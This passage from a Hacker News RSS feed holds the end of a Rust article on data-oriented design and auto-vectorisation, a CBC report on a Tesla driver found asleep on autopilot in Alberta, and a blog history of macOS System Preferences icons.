    <span>health</span><span>:</span> <span>Vec</span><span>&lt;</span><span>f64</span><span>&gt;</span><span>,</span>
    <span>locations</span><span>:</span> <span>Vec</span><span>&lt;</span><span>(</span><span>f64</span><span>,</span> <span>f64</span><span>)</span><span>&gt;</span><span>,</span>
    <span>velocities</span><span>:</span> <span>Vec</span><span>&lt;</span><span>(</span><span>f64</span><span>,</span> <span>f64</span><span>)</span><span>&gt;</span><span>,</span>
    <span>acceleration</span><span>:</span> <span>Vec</span><span>&lt;</span><span>(</span><span>f64</span><span>,</span> <span>f64</span><span>)</span><span>&gt;</span><span>,</span>
<span>}</span>
</code></pre></div></div>

<p>Now we can do the same calculation as in the OOP case as follows:</p>

<div><div><pre><code><span>pub</span> <span>fn</span> <span>run_dop</span><span>(</span><span>world</span><span>:</span> <span>&amp;</span><span>mut</span> <span>DOPlayers</span><span>)</span> <span>{</span>
    <span>for</span> <span>(</span><span>pos</span><span>,</span> <span>(</span><span>vel</span><span>,</span> <span>acc</span><span>))</span> <span>in</span> <span>world</span>
        <span>.locations</span>
        <span>.iter_mut</span><span>()</span>
        <span>.zip</span><span>(</span><span>world</span><span>.velocities</span><span>.iter_mut</span><span>()</span><span>.zip</span><span>(</span><span>world</span><span>.acceleration</span><span>.iter</span><span>()))</span>
    <span>{</span>
        <span>*</span><span>pos</span> <span>=</span> <span>(</span><span>pos</span><span>.</span><span>0</span> <span>+</span> <span>vel</span><span>.</span><span>0</span><span>,</span> <span>pos</span><span>.</span><span>1</span> <span>+</span> <span>vel</span><span>.</span><span>1</span><span>);</span>
        <span>*</span><span>vel</span> <span>=</span> <span>(</span><span>vel</span><span>.</span><span>0</span> <span>+</span> <span>acc</span><span>.</span><span>0</span><span>,</span> <span>vel</span><span>.</span><span>1</span> <span>+</span> <span>acc</span><span>.</span><span>1</span><span>);</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>In this case the memory layout is as follows:</p>
<div><div><pre><code>-- DOPlayers
name1    -- names
name2
...
health1    -- health
health2
...
location1    -- locations
location2
...
</code></pre></div></div>

<p>The relevant fields are now stored contiguously. Given that each
location tuple will be 16 bytes, we could now feasibly load 4 location
tuples on the same cache line to operate on them simultaneously with
SIMD instructions.</p>

<h3 id="benchmark">Benchmark</h3>

<p>Here are the results of the criterion benchmark for the above code (the
full code and benchmark code is available <a href="https://github.com/jamesmcm/data-oriented-example">in the Github repo</a>):</p>

<p><img src="https://jamesmcm.github.io/images/soa.svg" alt="AoS vs. SoA benchmark" title="AoS vs. SoA benchmark"></p>

<p>Overall, we see that the data-oriented approach finishes in half the
time. This would seem to be due to the data-oriented case operating on
two Players at a time - we can confirm this by reviewing the compiled
assembly.</p>

<p>Reviewing the <a href="https://godbolt.org/z/d8bjMb">output on Godbolt</a> we see the following:</p>

<pre><code>// Relevant OOP loop
.LBB0_2:
        movupd  xmm0, xmmword ptr [rax + rdx + 32]
        movupd  xmm1, xmmword ptr [rax + rdx + 48]
        movupd  xmm2, xmmword ptr [rax + rdx + 64]
        addpd   xmm0, xmm1
        movupd  xmmword ptr [rax + rdx + 32], xmm0
        addpd   xmm2, xmm1
        movupd  xmmword ptr [rax + rdx + 48], xmm2
        add     rdx, 80
        cmp     rcx, rdx
        jne     .LBB0_2

// ...
// Relevant DOP loop
.LBB1_7:
        movupd  xmm0, xmmword ptr [rcx + rdx - 16]
        movupd  xmm1, xmmword ptr [rax + rdx - 16]
        addpd   xmm1, xmm0
        movupd  xmmword ptr [rcx + rdx - 16], xmm1
        movupd  xmm0, xmmword ptr [r9 + rdx - 16]
        movupd  xmm1, xmmword ptr [rax + rdx - 16]
        addpd   xmm1, xmm0
        movupd  xmm0, xmmword ptr [rax + rdx]
        movupd  xmmword ptr [rax + rdx - 16], xmm1
        add     rdi, 2
        movupd  xmm1, xmmword ptr [rcx + rdx]
        addpd   xmm1, xmm0
        movupd  xmmword ptr [rcx + rdx], xmm1
        movupd  xmm0, xmmword ptr [rax + rdx]
        movupd  xmm1, xmmword ptr [r9 + rdx]
        addpd   xmm1, xmm0
        movupd  xmmword ptr [rax + rdx], xmm1
        add     rdx, 32
        cmp     rsi, rdi
        jne     .LBB1_7
        test    r8, r8
        je      .LBB1_5
</code></pre>

<p>We can see in the data-oriented case, the loop is unrolled to operate on
two elements at once - resulting in the 50% speed up overall!</p>

<p><strong>Addendum</strong>: As noted by <a href="https://www.reddit.com/r/rust/comments/hxqwom/an_introduction_to_data_oriented_design_with_rust/fz8lxcq/">/u/five9a2 on Reddit</a>
the above output is specifically for the default target, which is
misleading since <code>cargo bench</code> uses the native target by default (i.e.
all possible features on your CPU), so our benchmarks are not using the
above assembly code.</p>

<p>By setting the compiler flag to <code>-C target-cpu=skylake-avx512</code> to enable 
Skylake features, we get the <a href="https://godbolt.org/z/PEPdvn">following output</a>:</p>

<pre><code>// OOP loop
.LBB0_2:
        vmovupd ymm0, ymmword ptr [rax + rdx + 32]
        vaddpd  ymm0, ymm0, ymmword ptr [rax + rdx + 48]
        vmovupd ymmword ptr [rax + rdx + 32], ymm0
        add     rdx, 80
        cmp     rcx, rdx
        jne     .LBB0_2

...
// DOP loop
.LBB1_19:
        vmovupd zmm0, zmmword ptr [rsi + 4*rax - 64]
        vaddpd  zmm0, zmm0, zmmword ptr [rcx + 4*rax - 64]
        vmovupd zmmword ptr [rsi + 4*rax - 64], zmm0
        vmovupd zmm0, zmmword ptr [rcx + 4*rax - 64]
        vaddpd  zmm0, zmm0, zmmword ptr [r10 + 4*rax - 64]
        vmovupd zmmword ptr [rcx + 4*rax - 64], zmm0
        vmovupd zmm0, zmmword ptr [rsi + 4*rax]
        vaddpd  zmm0, zmm0, zmmword ptr [rcx + 4*rax]
        vmovupd zmmword ptr [rsi + 4*rax], zmm0
        vmovupd zmm0, zmmword ptr [rcx + 4*rax]
        vaddpd  zmm0, zmm0, zmmword ptr [r10 + 4*rax]
        vmovupd zmmword ptr [rcx + 4*rax], zmm0
        add     r11, 8
        add     rax, 32
        add     rdi, 2
        jne     .LBB1_19
        test    r9, r9
        je      .LBB1_22
</code></pre>

<p>Here we see the OOP loop making use of the 256-bit ymm registers for the
position tuple and velocity tuple, and another for the velocity tuple
and acceleration tuple. This is possible because they are adjacent in
memory (due to the ordering of the fields). In the DOP loop,
the 512-bit zmm register is used.</p>

<p>It seems the performance differences comes from the bandwidth between
cache levels, since the performance is identical for the small examples.
This can be demonstrated further by removing the extra fields from the
struct - in this case we see only a 25% performance difference (<a href="https://godbolt.org/z/Th91Wa">godbolt
link</a>), and this
corresponds to Player struct now being 384 bits (and so 1/4 of the
512-bit read/write is unused).</p>

<p>This emphasises how important it is to consider your deployment target,
and if deploying performance-sensitive code, to consider setting the
target-cpu explicitly to benefit from all of its features.</p>

<p>It also demonstrates how the ordering of fields can be important to
performance. By default Rust will re-order fields automatically, but you can set
<code>#[repr(C)]</code> to disable this (necessary for C interoperability for
example).</p>

<h3 id="summary">Summary</h3>

<p>This example demonstrates the importance of considering memory layout
when aiming for performant code and auto-vectorisation.</p>

<p>Note that the same logic can also apply when working with arrays of
structs - making your struct smaller will allow you to load more
elements on the same cache line and possibly lead to autovectorisation.
<a href="https://github.com/Rene-007/flake_growth/blob/master/src/helpers.rs">Here is an example</a> of
a crate (which was shared on the <a href="https://www.reddit.com/r/rust/comments/hmqjvs/growing_gold_with_rust/">Rust subreddit</a>) that achieved a 40% performance
improvement by doing just that.</p>

<p>This particular re-organisation has a direct analogue in database design. A
major difference between databases aimed at transactional (OLTP)
workloads and analytical (OLAP) workloads is that the latter tend to use
columnar-based storage. Just like the case above, this means that
operations on one column can take advantage of the contiguous storage
and use vector operations, which tends to be the main access pattern for
analytical workloads (e.g. calculate the average purchase size across all rows,
rather than updating and retrieving entire, specific rows).</p>

<p>In the case of analytical databases this is actually a double win, since it also
applies to the serialisation of the data to disk, where compression can
now be applied along the column (where the data is guaranteed to be of the
same type) leading to much better compression ratios.</p>

<p>If you are working on a problem that might benefit from the struct of
arrays approach, and want to run a quick benchmark, you might be
interested in the <a href="https://github.com/lumol-org/soa-derive">soa-derive</a>
crate that will allow you to derive the struct of arrays from your
struct.</p>

<h2 id="branching-in-a-hot-loop">Branching in a hot loop</h2>

<p>Another optimisation tactic is to avoid branching in any “hot” parts of
the code (i.e. any part that will be executed many, many times).</p>

<p>Branching can arise in subtle ways, often by trying to use one struct for many
different cases. For example, we might define some general Node type …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jamesmcm.github.io/blog/2020/07/25/intro-dod/">https://jamesmcm.github.io/blog/2020/07/25/intro-dod/</a></em></p>]]>
            </description>
            <link>https://jamesmcm.github.io/blog/2020/07/25/intro-dod/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24506744</guid>
            <pubDate>Thu, 17 Sep 2020 16:34:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Speeding Tesla driver caught napping behind the wheel on Alberta highway]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 5 (<a href="https://news.ycombinator.com/item?id=24506649">thread link</a>) | @mtr
<br/>
September 17, 2020 | https://www.cbc.ca/news/canada/edmonton/tesla-driver-autopilot-alberta-ponoka-speeding-dangerous-driving-1.5727828 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/canada/edmonton/tesla-driver-autopilot-alberta-ponoka-speeding-dangerous-driving-1.5727828">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>A 20-year-old B.C. motorist who who found reclining behind the wheel of a Tesla while the electric vehicle was on autopilot has been charged by the RCMP in Alberta with speeding.</p><div><figure><div><p><img alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5727840.1600356254!/fileImage/httpImage/image.JPG_gen/derivatives/16x9_780/tesla-speeding-alberta.JPG"></p></div><figcaption>The 20-year-old B.C. driver of this Tesla Model S has been charged with speeding and dangerous driving, a criminal offence. The incident occurred on July 9 on Highway 2 near Ponoka, about 100 kilometres south of Edmonton.<!-- --> <!-- -->(Alberta RCMP)</figcaption></figure><p><span><p>The RCMP&nbsp;in Alberta have charged a&nbsp;20-year-old British Columbia man with&nbsp;speeding while he was asleep at the wheel of a Tesla electric car.</p>  <p>The RCMP&nbsp;received&nbsp;a call at about&nbsp;4 p.m. on July 9 concerning&nbsp;a 2019 Tesla Model S speeding south on Highway 2 near Ponoka, about 100&nbsp;kilometres south of Edmonton.</p>  <p>Both front seats were fully&nbsp;reclined, and both the driver and passenger&nbsp;appeared to be sound asleep, police say.&nbsp;</p>  <p>The car appeared to be driving on&nbsp;autopilot at more than 140 km/h, RCMP&nbsp;Sgt. Darrin Turnbull&nbsp;told CBC News on Thursday. The speed limit on that stretch of highway is 110 km/h.</p>  <p>"Nobody was looking out the windshield to see where the car was going," he&nbsp;said.&nbsp;</p>  <p>"I've been in policing for over 23 years&nbsp;and the&nbsp;majority of that in traffic&nbsp;law enforcement, and I'm speechless.</p>  <p>"I've never, ever seen anything like this before, but of course the technology wasn't there."&nbsp;</p>  <p>Tesla Model S sedans have autopilot functions, including auto-steer and "traffic-aware" cruise control, and both functions appeared to be activated.</p>  <p>"We believe the vehicle&nbsp;was operating on the autopilot system, which is really just an advanced driver safety system, a driver assist program. You still need to be driving the vehicle," Turnbull said.&nbsp;</p>  <p>"But of course, there are after-market things that can be done to a vehicle against the manufacturer's recommendations to change or circumvent the safety system."&nbsp;</p>  <p>After the responding officer activated emergency lights on their vehicle, the Tesla automatically began to accelerate, Turnbull said, even as those vehicles that were ahead of the Tesla on the highway moved out of the way.</p>  <p>"Nobody appeared to be in the car, but the vehicle sped up because the line was clear in front."</p>  <ul>  </ul>  <p>The responding officer obtained radar readings on the vehicle, confirming that it had automatically accelerated to exactly 150 km/h.</p>  <p>The RCMP charged the driver with speeding and issued a 24-hour licence suspension for fatigue.&nbsp;</p>  <p>After further investigation and consultation with the Crown, a Criminal Code charge of dangerous driving was laid against the driver, police said.</p>  <p>The driver was served with a summons for court in December.</p>  <ul>   <li><strong><a href="https://www.cbc.ca/news/business/tesla-s-self-driving-autopilot-system-under-scrutiny-1.5413931" target="_blank">Tesla's self-driving Autopilot system under scrutiny after 3 deadly crashes</a></strong></li>   <li><strong><a href="https://www.cbc.ca/news/canada/british-columbia/driverless-tesla-richmond-b-c-1.5349855" target="_blank">Driverless Tesla coasting along mall parking lot raises questions, causes confusion</a></strong></li>  </ul>  <p>Autonomous cars are in their early stages in much of Canada, with Ontario and Quebec approving pilot projects as long as a vigilant driver is present to take control of the vehicle when needed.</p>  <p>There have not been any reported self-driving car crashes in Canada, but several have been reported in the United States, putting Tesla's autopilot driving system functions&nbsp;under scrutiny.</p>  <p>On Dec. 29, 2019, a Tesla Model S sedan left a freeway in Gardena, Calif., at high speed, ran a red light and struck a Honda Civic, killing two people inside, police said. On the same day, a Tesla Model 3 hit a parked firetruck on an Indiana freeway, killing a passenger in the Tesla.</p>  <p>On Dec. 7, a Model 3 struck a police cruiser on a Connecticut highway, but&nbsp;no one was hurt.</p>  <p>Tesla's autopilot function is designed to keep a car in its lane and at a safe distance from other vehicles. Autopilot also can change lanes on its own.</p>  <ul>  </ul>  <h2>'It&nbsp;gives all of us a bad name'</h2>  <p>Angie Dean, president of the Tesla Owners Club of Alberta, said the incident is troubling for the 300 paying members of her group&nbsp;and the more than 1,000 active members of the club's online Facebook group.&nbsp;</p>  <p>Dean said the driver-assist functions in Tesla vehicles are designed to enhance safety, not detract from it.</p>  <p>"This type of story is sort of next to&nbsp;a worst-case scenario," she&nbsp;said. "The only thing that would be worse than this is if someone had got hurt.&nbsp;Everyone that I've spoken with is just so disappointed and so frustrated because it's abuse of the system.</p>  <p>"It&nbsp;gives all of us a bad name, and the vast majority of us would never do something like this. We bought these cars because we want to be safer."</p>  <p>The driver-assist program&nbsp;requires&nbsp;regular input from the driver to function,&nbsp;Dean said. If the driver's hands come off the wheel, warnings begin going off every 15 seconds, she said.</p>  <p>"It asks you to put your hands on the wheel&nbsp;and&nbsp;turn it a little bit so that it knows that your hands are on the wheel," Dean said.&nbsp;</p>  <p>"If you don't, it starts beeping at you. And if you still don't, it gets even louder. And&nbsp;if you still don't, it actually turns the hazard lights on, slows the vehicle down and it pulls it over. It turns the car off and autopilot will not engage for the rest of that drive."</p>  <p><strong><em>WATCH | Is the technology behind driverless cars ready for the road?</em></strong></p>  <p><span><span><span></span><span>The technology behind self-driving cars is available and in use, but there are examples showing it may not be fully ready for the real world.<!-- --> <!-- -->2:09</span></span></span></p>  <p>Despite the built-in safeguards, videos&nbsp;circulating online instruct drivers on ways to "hack" and override&nbsp;these systems, Dean&nbsp;said.</p>  <p>"There are a lot of systems that are in place that are really, really trying not to make this possible. But if there's a will, there's a way, I suppose. "&nbsp;</p>  <p>Just because some vehicles can drive themselves, it doesn't mean they should, the RCMP said.&nbsp;</p>  <p>&nbsp;"Although manufacturers of new vehicles have built in safeguards to prevent drivers from taking advantage of the new safety systems in vehicles, those systems are just that — supplemental safety systems," said Supt. Gary Graham of Alberta RCMP Traffic Services.&nbsp;</p>  <p>"They are not self-driving systems, they still come with the responsibility of driving."</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/canada/edmonton/tesla-driver-autopilot-alberta-ponoka-speeding-dangerous-driving-1.5727828</link>
            <guid isPermaLink="false">hacker-news-small-sites-24506649</guid>
            <pubDate>Thu, 17 Sep 2020 16:28:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The untold history of macOS System Preferences]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24506591">thread link</a>) | @ddrmaxgt37
<br/>
September 17, 2020 | https://www.arun.is/blog/system-preferences/ | <a href="https://web.archive.org/web/*/https://www.arun.is/blog/system-preferences/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><img src="https://www.arun.is/static/bcd87d10064d4d4dadd22884565ba04d/cover.jpg" alt="feature"></p><section><div><p><span><span>Published September 17, 2020</span></span></p></div><div><h2 id="history">History</h2><p>The current version of macOS descended from Mac OS X, announced at Macworld in
2000 by Steve Jobs<sup><a href="#footnote_1">[1]</a></sup>. Since then,
including the Public Beta of version 10.0, there have been 17 different releases
till now. The next one, version 11.0, titled Big Sur, is coming later this year.</p><p>In the intervening two decades, a lot has changed. In 2002, Steve Jobs famously
dropped support for OS 9 by staging a funeral at WWDC. Macs transitioned from
PowerPC to Intel chips and later to 64-bit only. Apple switched from naming
releases after big cats like Panther and Jaguar to naming releases after
California locations. It also renamed Mac OS X to macOS to conform better with
iOS and later iPadOS.</p><p>The interface started glassy and skeuomorphic, mimicking the materials used on
Macs. Over the decades, it went through significant
revisions<sup><a href="#footnote_2">[2]</a></sup>.</p><p>One thing that seems to have remained relatively unchanged over the years is the
System Preferences screen.</p><p><span><iframe src="https://player.vimeo.com/video/457568483?background=1" frameborder="0" webkitallowfullscreen="true" mozallowfullscreen="true" allowfullscreen="" title="vimeo video"></iframe></span></p><p>But, at a closer glance, we’ll see that this mundane part of the operating
system has changed quite a bit and hides some fun easter eggs and surprises.</p><h2 id="how-things-have-changed">How things have changed</h2><h3 id="favorites-bar">Favorites bar</h3><p>Early versions of OS X until 10.3 included a favorites bar at the top where
users could drag and drop their favorite settings. In 10.4, this was removed and
replaced with the search feature that highlights matching icons as you type a
query.</p><p><span>
      <span></span>
  <img alt="favorites" title="favorites" src="https://www.arun.is/static/313d3074bcdaeda86ea3b9f9141a3695/20801/favorites.jpg" srcset="https://www.arun.is/static/313d3074bcdaeda86ea3b9f9141a3695/98e5d/favorites.jpg 180w,https://www.arun.is/static/313d3074bcdaeda86ea3b9f9141a3695/543cd/favorites.jpg 360w,https://www.arun.is/static/313d3074bcdaeda86ea3b9f9141a3695/20801/favorites.jpg 720w,https://www.arun.is/static/313d3074bcdaeda86ea3b9f9141a3695/b37e7/favorites.jpg 1080w,https://www.arun.is/static/313d3074bcdaeda86ea3b9f9141a3695/33266/favorites.jpg 1440w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
    </span></p><h3 id="mouse">Mouse</h3><p>The first mouse to appear System Preferences is the black translucent Apple Pro
Mouse<sup><a href="#footnote_3">[3]</a></sup>. Between the Public Beta and the
10.0 release, an optical sensor’s red glow was added to reflect how the mouse
looks when in use. Following that is the white iteration of that mouse, the
short-lived Mighty Mouse, and then finally the Magic Mouse, which has undergone
only minor updates till today.</p><p><span>
      <span></span>
  <img alt="mouse" title="mouse" src="https://www.arun.is/static/6bdfc8a50d309f652a522878c13db51d/20801/mouse.jpg" srcset="https://www.arun.is/static/6bdfc8a50d309f652a522878c13db51d/98e5d/mouse.jpg 180w,https://www.arun.is/static/6bdfc8a50d309f652a522878c13db51d/543cd/mouse.jpg 360w,https://www.arun.is/static/6bdfc8a50d309f652a522878c13db51d/20801/mouse.jpg 720w,https://www.arun.is/static/6bdfc8a50d309f652a522878c13db51d/b37e7/mouse.jpg 1080w,https://www.arun.is/static/6bdfc8a50d309f652a522878c13db51d/33266/mouse.jpg 1440w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
    </span></p><h3 id="keyboard">Keyboard</h3><p>Similarly, the keyboard icons have represented the keyboard available at the
given time. In 10.0, it’s an Apple Pro Keyboard. From 10.1 to 10.5, it’s only a
single command key, but then in 10.6, a full keyboard is shown again.</p><p><span>
      <span></span>
  <img alt="keyboard" title="keyboard" src="https://www.arun.is/static/78d4d3feef83c2e4c287773597512d65/20801/keyboard.jpg" srcset="https://www.arun.is/static/78d4d3feef83c2e4c287773597512d65/98e5d/keyboard.jpg 180w,https://www.arun.is/static/78d4d3feef83c2e4c287773597512d65/543cd/keyboard.jpg 360w,https://www.arun.is/static/78d4d3feef83c2e4c287773597512d65/20801/keyboard.jpg 720w,https://www.arun.is/static/78d4d3feef83c2e4c287773597512d65/b37e7/keyboard.jpg 1080w,https://www.arun.is/static/78d4d3feef83c2e4c287773597512d65/33266/keyboard.jpg 1440w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
    </span></p><p>Peculiarly, in 10.3, 10.4, and 10.5, the Mouse and Keyboard settings were
combined into one, but then in 10.6, they were split up again.</p><h3 id="displays">Displays</h3><p>Unsurprisingly, the Displays icon has always reflected the latest Apple display
starting with the transparent polycarbonate Cinema Displays until today’s Pro
Display XDR. The small size allocated to the icons has meant that they usually
look a little cartoonish and out of proportion, but still consistent with the
rest of the icon set. However, in Big Sur, the display icon’s proportions were
adjusted much closer to how Pro Display XDR looks in reality.</p><p><span>
      <span></span>
  <img alt="displays" title="displays" src="https://www.arun.is/static/a6c12ca730ff1a899d96e58507288b58/20801/displays.jpg" srcset="https://www.arun.is/static/a6c12ca730ff1a899d96e58507288b58/98e5d/displays.jpg 180w,https://www.arun.is/static/a6c12ca730ff1a899d96e58507288b58/543cd/displays.jpg 360w,https://www.arun.is/static/a6c12ca730ff1a899d96e58507288b58/20801/displays.jpg 720w,https://www.arun.is/static/a6c12ca730ff1a899d96e58507288b58/b37e7/displays.jpg 1080w,https://www.arun.is/static/a6c12ca730ff1a899d96e58507288b58/33266/displays.jpg 1440w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
    </span></p><h3 id="print--fax">Print &amp; Fax</h3><p>10.3 introduced the Print &amp; Fax setting. Then in 10.7, amidst the waning use of
fax machines, it was renamed Print and Scan. Finally, in 10.9, it was renamed
again to the nouns Printers &amp; Scanners to fit grammatically with everything
else.</p><p><span>
      <span></span>
  <img alt="print" title="print" src="https://www.arun.is/static/8ed1948be22758a9f7b6c010946d6b0f/20801/print.jpg" srcset="https://www.arun.is/static/8ed1948be22758a9f7b6c010946d6b0f/98e5d/print.jpg 180w,https://www.arun.is/static/8ed1948be22758a9f7b6c010946d6b0f/543cd/print.jpg 360w,https://www.arun.is/static/8ed1948be22758a9f7b6c010946d6b0f/20801/print.jpg 720w,https://www.arun.is/static/8ed1948be22758a9f7b6c010946d6b0f/b37e7/print.jpg 1080w,https://www.arun.is/static/8ed1948be22758a9f7b6c010946d6b0f/33266/print.jpg 1440w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
    </span></p><h3 id="energy-saver">Energy Saver</h3><p>In the first OS X Public Beta, a shade drawn over a window represented Energy
Saver. Before release, the now recognizable light bulb took its place.</p><p>Over the years, the icon has represented the most efficient light bulb
technology of the time. So, in 10.5, the icon changed from an incandescent bulb
to a more efficient compact fluorescent. Then, in 10.10, the light bulb changed
again to an LED design.</p><p><span>
      <span></span>
  <img alt="energy saver" title="energy saver" src="https://www.arun.is/static/eb20a5f38d91edd23aa9f792463f7503/20801/energy_saver.jpg" srcset="https://www.arun.is/static/eb20a5f38d91edd23aa9f792463f7503/98e5d/energy_saver.jpg 180w,https://www.arun.is/static/eb20a5f38d91edd23aa9f792463f7503/543cd/energy_saver.jpg 360w,https://www.arun.is/static/eb20a5f38d91edd23aa9f792463f7503/20801/energy_saver.jpg 720w,https://www.arun.is/static/eb20a5f38d91edd23aa9f792463f7503/b37e7/energy_saver.jpg 1080w,https://www.arun.is/static/eb20a5f38d91edd23aa9f792463f7503/33266/energy_saver.jpg 1440w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
    </span></p><p>Big Sur will make away with the Energy Saver setting altogether for MacBooks
(they are keeping it for desktops), replacing it with the more intuitively
named”Battery setting. Oh, light bulb icon, you will be missed.</p><h3 id="network">Network</h3><p>In the Public Beta, Network was a globe focused on the western hemisphere, with
lines drawn as if connecting cities. Just three releases later in 10.3, that was
changed over to the abstract glass ball with circular lines, a variation of
which we still see today.</p><p><span>
      <span></span>
  <img alt="network" title="network" src="https://www.arun.is/static/8a0e9801d57bf94c8ca81bc92fb91d7e/20801/network.jpg" srcset="https://www.arun.is/static/8a0e9801d57bf94c8ca81bc92fb91d7e/98e5d/network.jpg 180w,https://www.arun.is/static/8a0e9801d57bf94c8ca81bc92fb91d7e/543cd/network.jpg 360w,https://www.arun.is/static/8a0e9801d57bf94c8ca81bc92fb91d7e/20801/network.jpg 720w,https://www.arun.is/static/8a0e9801d57bf94c8ca81bc92fb91d7e/b37e7/network.jpg 1080w,https://www.arun.is/static/8a0e9801d57bf94c8ca81bc92fb91d7e/33266/network.jpg 1440w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
    </span></p><h3 id="date--time">Date &amp; Time</h3><p>Since the Public Beta, the calendar in the icon has shown an 18. 10.10 added the
month of July to the icon. July 18 likely refers to the day that the Mac OS X
Public Beta was first announced at Macworld New York.</p><p><span>
      <span></span>
  <img alt="date" title="date" src="https://www.arun.is/static/b1d9e4e3b1929a516259d4ba8fef1079/20801/date.jpg" srcset="https://www.arun.is/static/b1d9e4e3b1929a516259d4ba8fef1079/98e5d/date.jpg 180w,https://www.arun.is/static/b1d9e4e3b1929a516259d4ba8fef1079/543cd/date.jpg 360w,https://www.arun.is/static/b1d9e4e3b1929a516259d4ba8fef1079/20801/date.jpg 720w,https://www.arun.is/static/b1d9e4e3b1929a516259d4ba8fef1079/b37e7/date.jpg 1080w,https://www.arun.is/static/b1d9e4e3b1929a516259d4ba8fef1079/33266/date.jpg 1440w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
    </span></p><p>In Big Sur, after 20 years of showing July 18, that icon has changed to July 17,
likely to conform with the Calendar app icon. iCal, as the Calendar app was
previously known, was first shown to the public on July 17, 2002.</p><h3 id="language--region">Language &amp; Region</h3><p>At first, this one was called International, then renamed to Language &amp; Text and
finally Language and Region. The icon was a flag bearing the logo of the United
Nations. In 10.13, a banal globe icon replaced the UN logo.</p><p><span>
      <span></span>
  <img alt="international" title="international" src="https://www.arun.is/static/cb007953e65e9f977f6d3a848d74e61a/20801/international.jpg" srcset="https://www.arun.is/static/cb007953e65e9f977f6d3a848d74e61a/98e5d/international.jpg 180w,https://www.arun.is/static/cb007953e65e9f977f6d3a848d74e61a/543cd/international.jpg 360w,https://www.arun.is/static/cb007953e65e9f977f6d3a848d74e61a/20801/international.jpg 720w,https://www.arun.is/static/cb007953e65e9f977f6d3a848d74e61a/b37e7/international.jpg 1080w,https://www.arun.is/static/cb007953e65e9f977f6d3a848d74e61a/33266/international.jpg 1440w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
    </span></p><h2 id="looking-forward-to-big-sur">Looking forward to Big Sur</h2><p>Mac UI has evolved considerably, yet gradually over the last two decades. Big
Sur takes this further<sup><a href="#footnote_4">[4]</a></sup> and tones down
the three-dimensional aspects of the interface such as gradients, shadows, and
borders.</p><p>The icons in System Preferences, on the other hand, have gone the complete
opposite direction. The Sound icon now emits transparent sound waves. Screen
Time is now a realistic, clear hourglass. Spotlight is now a realistic
magnifying glass.</p><p><span><iframe src="https://player.vimeo.com/video/458835318?background=1" frameborder="0" webkitallowfullscreen="true" mozallowfullscreen="true" allowfullscreen="" title="vimeo video"></iframe></span></p><p>I welcome these changes and can’t wait to use them once Big Sur launches.</p><hr><ol><li><span id="footnote_1"><a href="https://www.youtube.com/watch?v=Ko4V3G4NqII"><i>Macworld San Francisco 2000</i></a>&nbsp;<a href="#1">↩︎</a></span></li><li><span id="footnote_2"><a href="https://512pixels.net/2014/04/aqua-past-future/"><i>On the Past, Present and Future of Apple’s Aqua User Interface </i></a> · 512 Pixels<!-- -->&nbsp;<a href="#2">↩︎</a></span></li><li><span id="footnote_3"><a href="http://www.minimallyminimal.com/blog/apple-pro-mouse"><i>Apple (Pro) Mouse</i></a> · Minimally Minimal<!-- -->&nbsp;<a href="#3">↩︎</a></span></li><li><span id="footnote_4"><a href="https://www.andrewdenty.com/blog/2020/07/01/a-visual-comparison-of-macos-catalina-and-big-sur.html"><i>A visual comparison of macOS Catalina and Big Sur</i></a> · Andrew Denty<!-- -->&nbsp;<a href="#4">↩︎</a></span></li></ol><hr><p>Thanks to Q for reading drafts of this. Thanks to
<a href="https://twitter.com/gruber">John Gruber</a> and
<a href="https://twitter.com/siracusa">John Siracusa</a> for helping me track down the
significance of July 18. Thanks to Stephen Hackett at
<a href="https://512pixels.net/">512 Pixels</a> and
<a href="https://guidebookgallery.org/">GUIdebook</a> for screenshots of older versions of
macOS.</p><p><strong>Update:</strong> I previously mistakenly said that Energy Saver would be replaced by
the Battery setting, but I have learned that it only applies to MacBook laptops.
Enegy Saver will remain on desktops.</p></div></section><div><div><p><span>Subscribe to the newsletter</span></p></div></div></div></div></div>]]>
            </description>
            <link>https://www.arun.is/blog/system-preferences/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24506591</guid>
            <pubDate>Thu, 17 Sep 2020 16:24:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Nvidia’s Ultimate Play]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24506521">thread link</a>) | @swalsh
<br/>
September 17, 2020 | https://www.mooreslawisdead.com/post/nvidia-s-ultimate-play | <a href="https://web.archive.org/web/*/https://www.mooreslawisdead.com/post/nvidia-s-ultimate-play">archive.org</a>
